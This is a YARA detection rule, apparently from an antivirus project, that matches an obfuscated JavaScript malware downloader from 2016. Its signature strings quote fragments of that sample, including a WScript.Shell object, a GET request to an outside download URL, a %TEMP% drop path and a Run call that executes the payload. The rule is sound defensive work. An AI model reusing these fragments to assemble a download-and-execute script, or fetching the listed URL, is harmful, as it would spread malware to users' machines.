rule sig_20160427_95523d13fb968fdb9569ba41b7c78caa {
  meta:
    description = "datamaliciousorder - file 20160427_95523d13fb968fdb9569ba41b7c78caa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0f55d61059f0351aeb747a9275efc6c9ca6458d908ac96329841f69b469c8b4d"

  strings:
    $s1  = "VrnuqCxnal[WbolxXzzys](\"G\" + \"ET\", \"http://pediatriayvacunas.com/q0wps\", false);" fullword ascii
    $s2  = "function OjmatKfjhg(GrndfOjuds, CocyuPenlm){BacdkErdwt = BacdkErdwt * 1; return GrndfOjuds - CocyuPenlm;};" fullword ascii
    $s3  = "function HruqlCserp() {return QugugIzkdp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"9hC6p5Y" ascii
    $s4  = "function HruqlCserp() {return QugugIzkdp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"9hC6p5Y" ascii
    $s5  = "var QugugIzkdp = function GedsdAtagi() {return CdjkrQpfzg[LsajmQteio](\"WScript\"+\".Shell\");}(), RzpllDfhzf = 11;" fullword ascii
    $s6  = "var CdjkrQpfzg = this[\"WScript\"];" fullword ascii
    $s7  = "if (VrnuqCxnal[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function HgmaeDdsvb(){return BajpoJsmqg + \"\";};" fullword ascii
    $s9  = "function OzeibTtawo() {return ((BwclxHxfyd == true) && (BwclxHxfyd == DqzqtZjnid)) ? 1 : BacdkErdwt;};" fullword ascii
    $s10 = "}while (DciouAxnhm);" fullword ascii
    $s11 = "var DqzqtZjnid = false;" fullword ascii
    $s12 = "function ZvmzrEapqf(MjndzKrkcg) {var DthmeGgfrs = (1, 2, 3, 4, 5, MjndzKrkcg); return DthmeGgfrs;};" fullword ascii
    $s13 = "function EkzsxHyqda(){return 23;};" fullword ascii
    $s14 = "var BouclRamrx = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "function LtskdKxiiq(ApmxxVzciv){QugugIzkdp[\"R\"+\"un\"](ApmxxVzciv, BacdkErdwt, BacdkErdwt);};" fullword ascii
    $s16 = "var EjfvlWmjlj = false;" fullword ascii
    $s17 = "DqzqtZjnid = true; " fullword ascii
    $s18 = "return OjmatKfjhg(PgvctAwvog, NeveoVnjkc);" fullword ascii
    $s19 = "var BwclxHxfyd = false;" fullword ascii
    $s20 = "BwclxHxfyd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}